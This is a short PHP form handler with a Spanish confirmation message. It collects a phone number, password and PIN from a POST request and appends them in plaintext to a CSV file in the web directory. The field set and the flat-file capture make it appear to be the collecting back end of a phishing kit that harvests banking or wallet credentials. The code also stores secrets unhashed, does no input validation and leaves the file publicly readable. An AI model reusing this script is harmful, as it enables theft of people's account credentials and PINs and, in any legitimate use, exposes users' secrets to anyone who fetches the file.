<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $phone = $_POST['phone'];
  $password = $_POST['password'];
  $pin = $_POST['pin'];
  
  $data = array($phone, $password, $pin);
  $csvData = implode(',', $data) . "\n";
  
  $file = fopen('data.csv', 'a');
  fwrite($file, $csvData);
  fclose($file);
  
  echo 'Los datos se han guardado correctamente.';
}
?>
